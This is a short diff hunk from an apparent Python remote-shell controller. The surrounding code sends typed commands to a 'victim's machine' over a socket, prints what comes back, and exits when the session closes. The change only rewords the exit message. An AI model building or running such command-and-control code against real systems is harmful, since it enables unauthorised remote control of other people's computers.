@@ -58,7 +58,7 @@ def main(s):
 				s.sendall(inp.encode()) # Send command to the victim's machine
 				recv_output = s.recv(16384)
 				if recv_output.decode() == "sesclosed":
-					print(f"Connection to {host} closed.")
+					print("Received session close. Exiting...")
 					sys.exit(0)
 				print(recv_output.decode())
 
